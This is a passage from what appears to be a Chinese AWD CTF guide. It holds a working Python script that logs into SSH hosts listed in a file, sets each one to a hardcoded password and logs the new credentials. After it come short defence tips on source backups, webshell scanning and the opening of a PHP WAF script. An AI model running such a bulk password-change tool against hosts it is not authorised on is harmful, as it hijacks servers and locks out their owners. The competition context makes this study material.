timeout &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
new_password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;xcxy@ncwss123&#34;&lt;/span&gt;


&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;SSH_Client&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;is_root &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; host
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; port
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; username
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; password
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ssh &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SSHClient&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;set_missing_host_key_policy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AutoAddPolicy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;timeout&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;exec_command&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; command&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exec_command&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;command&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr

    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;change_password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exec_command&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;passwd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;root&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            stdin&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s\n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        stdin&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s\n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; new_password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        stdin&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s\n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; new_password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        stdout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;success&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; stderr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new_password
            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;save_log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; filename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;filename&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;a+&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s %s %s %s\n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Usage:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\t python %s [FILENAME]&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    filename &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] Loading file : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; filename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;filename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; line &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            line &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; line&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rstrip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; line&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            host &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
            port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
            password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] Trying login : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; host&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                ssh_client &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; SSH_Client&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [-] %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;token keyword&#34;&gt;continue&lt;/span&gt;
            ssh_clients&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ssh_client&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] Login finished. &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+&amp;#125; Got [%d] clients. &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ssh_clients&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ssh_clients&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] Starting changing password. &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ssh_client &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; ssh_clients&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; ssh_client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;change_password&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] %s (Success!)&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ssh_client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            ssh_client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;save_log&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;success.log&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] %s (Failed!)&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ssh_client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] something like interesting!!! &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;h2 id=&#34;下载源码备份&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载源码备份&#34;&gt;#&lt;/a&gt; 下载源码，备份&lt;/h2&gt;
&lt;p&gt;使用 ssh 工具保留源码，复制两份，用 d 盾去扫一份&lt;br /&gt;
以免网站崩溃的时候无法及时恢复，导致 check 丢分&lt;/p&gt;
&lt;h2 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h2&gt;
&lt;p&gt;上面提到我们将源码 down 下来后利用 d 盾等工具扫描，将爆出来的 shell 注释修改或者删除等（具体怎么改根据比赛要求）&lt;/p&gt;
&lt;p&gt;接着就是监控脚本&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token function&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;LOG_FILEDIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/tmp/loooooooogs&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 日志文件目录&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_dir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;LOG_FILEDIR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 如果目录不存在则创建&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;mkdir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;LOG_FILEDIR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 创建目录&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; 
